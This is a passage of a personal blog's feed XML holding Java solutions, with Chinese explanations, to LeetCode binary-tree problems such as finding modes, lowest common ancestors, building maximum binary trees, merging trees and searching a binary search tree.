class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//定义需要的参数</span></span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        findMode1(root);</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[res.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; res.size();i++) &#123;</span><br><span class="line">            result[i] = res.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findMode1</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        findMode1(root.left);</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span> || pre.val != root.val) &#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count &gt; maxCount) &#123;</span><br><span class="line">            <span class="comment">//清除后更新</span></span><br><span class="line">            res.clear();</span><br><span class="line">            res.add(root.val);</span><br><span class="line">            maxCount = count;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(count == maxCount) &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root;</span><br><span class="line">        findMode1(root.right);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h4><p>link:<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/description/">236. 二叉树的最近公共祖先 - 力扣（LeetCode）</a></p><h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>可以使用两个栈来存储从根节点到 <code>p</code> 和 <code>q</code> 的路径，然后通过比较这两个路径来找到它们的最低公共祖先</p><h6 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">getPath</span><span class="params">(TreeNode root, TreeNode node, Stack&lt;TreeNode&gt; stack)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || node == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="keyword">if</span> (root == node) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flg</span> <span class="operator">=</span> getPath(root.left, node, stack);</span><br><span class="line">    <span class="keyword">if</span> (flg) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flg2</span> <span class="operator">=</span> getPath(root.right, node, stack);</span><br><span class="line">    <span class="keyword">if</span> (flg2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.pop();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;TreeNode&gt; stackP = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stackQ = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    getPath(root, p, stackP);</span><br><span class="line">    getPath(root, q, stackQ);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeP</span> <span class="operator">=</span> stackP.size();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeQ</span> <span class="operator">=</span> stackQ.size();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sizeP &gt; sizeQ) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> sizeP - sizeQ;</span><br><span class="line">        <span class="keyword">while</span> (size != <span class="number">0</span>) &#123;</span><br><span class="line">            stackP.pop();</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> sizeQ - sizeP;</span><br><span class="line">        <span class="keyword">while</span> (size != <span class="number">0</span>) &#123;</span><br><span class="line">            stackQ.pop();</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stackP.isEmpty() &amp;&amp; !stackQ.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stackP.peek().equals(stackQ.peek())) &#123;</span><br><span class="line">            <span class="keyword">return</span> stackP.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        stackP.pop();</span><br><span class="line">        stackQ.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="DFS（后序遍历）"><a href="#DFS（后序遍历）" class="headerlink" title="DFS（后序遍历）"></a>DFS（后序遍历）</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || root == p || root == q) &#123; <span class="comment">// 递归结束条件</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后序遍历</span></span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123; <span class="comment">// 若未找到节点 p 或 q</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123; <span class="comment">// 若找到一个节点</span></span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123; <span class="comment">// 若找到一个节点</span></span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 若找到两个节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;验证二叉搜索树&quot;&gt;&lt;a href=&quot;#验证二叉搜索树&quot; class=&quot;headerlink&quot; title=&quot;验证二叉搜索树&quot;&gt;&lt;/a&gt;验证二叉搜索树&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/validat</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x13</title>
    <link href="https://yubut.github.io/2024/11/13/yub%E3%81%AEAlgorithm.0x13/"/>
    <id>https://yubut.github.io/2024/11/13/yub%E3%81%AEAlgorithm.0x13/</id>
    <published>2024-11-13T07:10:48.000Z</published>
    <updated>2024-11-14T13:10:43.259Z</updated>
    
    <content type="html"><![CDATA[<h4 id="最大二叉树"><a href="#最大二叉树" class="headerlink" title="最大二叉树"></a>最大二叉树</h4><p>link：<a href="https://leetcode.cn/problems/maximum-binary-tree/description/">654. 最大二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>在数组中遍历找到最大值（根节点），分割得到左右子树，再回溯遍历左右子树（还是先找到最大值作为子树的根节点再遍历）</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> constructMaximumBinaryTree1(nums,<span class="number">0</span>,nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree1</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> leftIndex, <span class="type">int</span> rightIndex)</span> &#123;</span><br><span class="line">        <span class="comment">//没有元素了</span></span><br><span class="line">        <span class="keyword">if</span>(rightIndex - leftIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//只有一个元素 直接加入</span></span><br><span class="line">        <span class="keyword">if</span>(rightIndex - leftIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[leftIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxIndex</span> <span class="operator">=</span> leftIndex;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> nums[leftIndex];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> leftIndex; i &lt; rightIndex; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; maxVal) &#123;</span><br><span class="line">                maxVal = nums[i];</span><br><span class="line">                maxIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(maxVal);</span><br><span class="line">        <span class="comment">//划分左右子树</span></span><br><span class="line">        root.left = constructMaximumBinaryTree1(nums,leftIndex,maxIndex);</span><br><span class="line">        root.right = constructMaximumBinaryTree1(nums,maxIndex + <span class="number">1</span>,rightIndex);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p><strong>左闭右开区间的优点</strong><br>1.简化边界处理：使用左闭右开区间 <code>[leftIndex, rightIndex)</code> 意味着 <code>rightIndex</code> 是<strong>不包含的结束边界</strong>.</p><p>2.递归的分区更直观：分区时可以直接用 <code>leftIndex</code> 到 <code>maxIndex</code> 和 <code>maxIndex + 1</code> 到 <code>rightIndex</code>，无需额外调整索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root.left = constructMaximumBinaryTree1(nums, leftIndex, maxIndex);</span><br><span class="line">root.right = constructMaximumBinaryTree1(nums, maxIndex + <span class="number">1</span>, rightIndex);</span><br></pre></td></tr></table></figure><p>3.避免边界错误：半开区间让右边界始终指向范围的下一个位置，避免了因“是否包含结束位置”而导致的边界错误，尤其在处理数组下标时可以减少出错的风险.</p><h4 id="合并二叉树"><a href="#合并二叉树" class="headerlink" title="合并二叉树"></a>合并二叉树</h4><p>link：<a href="https://leetcode.cn/problems/merge-two-binary-trees/description/">617. 合并二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>虽然题目说了合并过程必须从根节点开始，但是我们给定的数据内容已经满足条件（hh 冤大头 还想着要先判断一下大小）<br>直接无脑加就是了，主要就是判空递归.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        &#125;</span><br><span class="line">        root1.val += root2.val;</span><br><span class="line">        <span class="comment">//递归</span></span><br><span class="line">        root1.left = mergeTrees(root1.left,root2.left);</span><br><span class="line">        root1.right = mergeTrees(root1.right,root2.right);</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的搜索"><a href="#二叉搜索树中的搜索" class="headerlink" title="二叉搜索树中的搜索"></a>二叉搜索树中的搜索</h4><p>link：<a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/description/">700. 二叉搜索树中的搜索 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>因为给的是二叉搜索树，最邻近的左子树根节点比root小，最邻近的右子树根节点比root大，所以用val和跟root比较，再遍历递归对应的子树即可.（相当于左右划分）</p><h6 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">searchBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span>(root == <span class="literal">null</span> || root.val == val) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.left, val);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.right, val);</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">searchBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(val &lt; root.val)&#123;</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(val &gt; root.val) &#123;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;最大二叉树&quot;&gt;&lt;a href=&quot;#最大二叉树&quot; class=&quot;headerlink&quot; title=&quot;最大二叉树&quot;&gt;&lt;/a&gt;最大二叉树&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/maximum-binary-</summary>
      
    
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x12</title>
    <link href="https://yubut.github.io/2024/11/10/yub%E3%81%AEAlgorithm.0x12/"/>
    <id>https://yubut.github.io/2024/11/10/yub%E3%81%AEAlgorithm.0x12/</id>
    <published>2024-11-10T06:50:58.000Z</published>
    <updated>2024-11-12T14:14:28.702Z</updated>
    
    <content type="html"><![CDATA[<h4 id="找树左下角的值"><a href="#找树左下角的值" class="headerlink" title="找树左下角的值"></a>找树左下角的值</h4><p>link：<a href="https://leetcode.cn/problems/find-bottom-left-tree-value/description/">513. 找树左下角的值 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看题目给出的样例分析，觉得可以从深度入手.如果是左子树深度最大，那直接输出最左边的左子树节点即可（只有一个左节点的话也是如出一辙）<br>又假设二叉树中至少有一个节点，就已经列举出一种特殊需要判断的情况了.</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//定义为-1 确保只有一个节点时也能成功遍历</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">Deepth</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         result = root.val;</span><br><span class="line">         exrloration(root,<span class="number">0</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 